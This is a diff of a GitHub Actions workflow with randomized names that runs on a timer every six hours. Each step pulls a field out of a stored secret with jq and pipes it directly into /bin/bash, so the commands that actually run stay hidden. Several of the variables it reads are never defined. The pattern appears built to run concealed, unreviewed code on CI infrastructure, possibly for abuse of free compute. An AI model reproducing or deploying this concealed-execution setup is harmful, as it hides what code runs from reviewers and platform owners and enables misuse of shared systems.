@@ -1,21 +1,23 @@
 name: elderlyremarkable
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 2/6 * * *'
-
+    - cron: '1 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: elderlyremarkable
         env:
-          rhj39: ${{ secrets.rhj39 }}
+          uo340: ${{ secrets.uo340 }}
         run: |
-          echo $rhj39 | jq -r .jw5 | /bin/bash
-          echo $ycep001 | jq -r .two6 | /bin/bash
-          echo $pu0864 | jq -r .qykfg75 | /bin/bash
-          echo $vvy14 | jq -r .b9 | /bin/bash
+          echo $uo340 | jq -r .pomov7296 | /bin/bash
+          echo $bfs2421 | jq -r .ovjs7786 | /bin/bash
+          echo $ll34 | jq -r .qkwvt6 | /bin/bash
+          echo $g5972 | jq -r .enr101 | /bin/bash
+          echo $bpxo2 | jq -r .nwj24 | /bin/bash
+          echo $mnx1 | jq -r .g5825 | /bin/bash
+          echo $snum904 | jq -r .ns7 | /bin/bash
 
